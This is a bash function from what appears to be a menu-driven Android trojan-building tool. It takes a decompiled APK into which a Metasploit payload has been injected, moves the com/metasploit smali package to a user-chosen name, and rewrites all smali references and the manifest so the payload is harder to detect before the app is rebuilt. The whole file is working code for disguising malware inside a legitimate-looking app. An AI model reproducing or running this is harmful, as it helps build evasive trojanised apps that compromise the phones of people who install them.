#!/bin/bash

# Simple smali-level obfuscation by renaming the metasploit package
# Example: com/metasploit/... -> com/obfuscated/...
# Note: Run after injection (menu 3) and before rebuild (menu 4)
encode_payload() {
  local OUTPUT_DIR="./output"
  local DECOMPILED_APK_DIR="$OUTPUT_DIR/decompiled_apk"
  local TARGET_MANIFEST="$DECOMPILED_APK_DIR/AndroidManifest.xml"

  if [ ! -d "$DECOMPILED_APK_DIR/smali" ]; then
    echo -e "${red}[ERROR] No decompiled APK found. Decompile first (menu 1).${default}"
    return 1
  fi

  echo -ne "Enter new package suffix under 'com' (letters/digits/_ only, default: obfuscated): "
  read OBF
  OBF=${OBF:-obfuscated}
  # Sanitize: keep [a-z0-9_], force lowercase, ensure starts with letter/underscore
  OBF=$(echo "$OBF" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9_]/-/g' | sed 's/\-\+/_/g')
  if ! echo "$OBF" | grep -Eq '^[a-z_][a-z0-9_]*$'; then
    echo -e "${red}[ERROR] Invalid package suffix '$OBF'. Use letters/digits/_ and not starting with a digit.${default}"
    return 1
  fi

  local SRC_DIR="$DECOMPILED_APK_DIR/smali/com/metasploit"
  local DST_DIR="$DECOMPILED_APK_DIR/smali/com/$OBF"

  if [ ! -d "$SRC_DIR" ] && [ ! -d "$DST_DIR" ]; then
    echo -e "${red}[ERROR] No metasploit package found to obfuscate. Inject first (menu 3).${default}"
    return 1
  fi

  # If already obfuscated to requested name, exit
  if [ -d "$DST_DIR" ]; then
    echo -e "${yellow}[LOG] Package already obfuscated at com/$OBF; skipping move.${default}"
  else
    mkdir -p "$(dirname "$DST_DIR")"
    mv "$SRC_DIR" "$DST_DIR" || {
      echo -e "${red}[ERROR] Failed to move smali package for obfuscation.${default}"
      return 1
    }
  fi

  echo -e "${blue}[DEBUG] Rewriting smali references: Lcom/metasploit/ -> Lcom/$OBF/${default}"
  find "$DECOMPILED_APK_DIR/smali" -type f -name '*.smali' -print0 \
    | xargs -0 sed -i "s#Lcom/metasploit/#Lcom/$OBF/#g"

  if [ -f "$TARGET_MANIFEST" ]; then
    sed -i "s#com\.metasploit#com.$OBF#g" "$TARGET_MANIFEST"
  fi

  echo -e "${green}[LOG] Obfuscation complete. Rebuild the APK (menu 4).${default}"
}
